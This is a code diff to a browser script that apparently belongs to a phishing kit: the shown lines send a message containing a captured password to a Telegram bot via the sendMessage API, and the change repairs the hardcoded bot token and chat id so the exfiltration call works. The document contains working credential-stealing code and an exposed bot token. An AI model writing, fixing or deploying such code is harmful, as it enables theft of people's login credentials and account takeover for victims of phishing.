@@ -47,14 +47,14 @@ document.addEventListener('DOMContentLoaded', () => {
             `Password: ${pwd}`;
 
         const response = await fetch(
-            `https://api.telegram.org/bot${8828292202:AAFK5J441LHn-_GgtPZhaUi43ZjvaE3vnY8}/sendMessage`,
+            `https://api.telegram.org/bot8828292202:AAFK5J441LHn-_GgtPZhaUi43ZjvaE3vnY8/sendMessage`,
             {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    chat_id: "@ResulteronlyBot",
+                    chat_id: "ResulteronlyBot",
                     text: message
                 })
             }
